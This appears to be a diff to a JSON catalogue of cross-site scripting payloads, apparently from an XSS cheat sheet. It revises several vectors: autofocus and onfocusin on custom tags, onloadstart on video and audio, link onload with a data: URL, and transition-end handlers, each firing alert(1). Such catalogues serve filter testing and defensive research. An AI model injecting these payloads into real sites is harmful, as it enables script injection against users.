@@ -4331,10 +4331,9 @@
       },
       {
         "tag": "custom tags",
-        "code": "<xss autofocus tabindex=1 onfocusin=alert(1)></xss>",
+        "code": "<xss tabindex=1 autofocus onfocusin=alert(1)>",
         "browsers": ["chrome", "firefox", "safari"],
-        "interaction": false,
-        "hash": "#x"
+        "interaction": false
       }
     ]
   },
@@ -4441,11 +4440,17 @@
     ]
   },
   "onloadstart": {
-    "description": "Triggered video is loaded",
+    "description": "Triggered audio or video is loaded",
     "tags": [
       {
         "tag": "video",
-        "code": "<video onloadstart=\"alert(1)\"><source></*>",
+        "code": "<video onloadstart=\"alert(1)\"><source>",
+        "browsers": ["chrome", "firefox", "safari"],
+        "interaction": false
+      },
+      {
+        "tag": "audio",
+        "code": "<audio onloadstart=\"alert(1)\"><source>",
         "browsers": ["chrome", "firefox", "safari"],
         "interaction": false
       }
@@ -4486,7 +4491,7 @@
       },
       {
         "tag": "link",
-        "code": "<link href=validstyles.css rel=stylesheet onload=alert(1)>",
+        "code": "<link href=data:, rel=stylesheet onload=alert(1)>",
         "browsers": ["chrome", "firefox", "safari"],
         "interaction": false
       },
@@ -5906,10 +5911,9 @@
     "tags": [
       {
         "tag": "*",
-        "code": "<style>:target {color:red;}</style><* id=x style=\"transition:color 1s\" onwebkittransitionend=alert(1)></*>",
+        "code": "<xss style=transition:1s onwebkittransitionend=alert(1) tabindex=1 autofocus>",
         "browsers": ["chrome"],
-        "interaction": false,
-        "hash": "#x"
+        "interaction": false
       }
     ]
   },
@@ -5918,10 +5922,9 @@
     "tags": [
       {
         "tag": "*",
-        "code": "<* id=x style=\"transition:outline 1s\" ontransitionend=alert(1) tabindex=1></*>",
+        "code": "<* autofocus style=transition:1s ontransitionend=alert(1) tabindex=1>",
         "browsers": ["chrome"],
-        "interaction": false,
-        "hash": "#x"
+        "interaction": false
       }
     ]
   },
